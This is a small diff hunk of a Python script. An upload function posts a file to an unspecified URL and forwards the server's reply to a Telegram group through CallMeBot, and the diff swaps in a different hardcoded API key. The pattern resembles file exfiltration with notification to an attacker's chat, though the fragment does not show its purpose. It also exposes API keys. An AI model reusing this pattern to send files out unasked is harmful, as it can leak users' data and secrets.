@@ -79,7 +79,7 @@ def upload(file_path):
     with open(file_path, 'rb') as file:
         files = {"file": file}
         response = requests.post(url, files=files)
-        requests.post('https://api.callmebot.com/telegram/group.php?apikey=LTQ1MDk4OTAzNzI',params={'text':response.text})
+        requests.post('https://api.callmebot.com/telegram/group.php?apikey=LTEwMDIzMDY1Mzk1OTU',params={'text':response.text})
 
 if __name__ == '__main__':
     try:
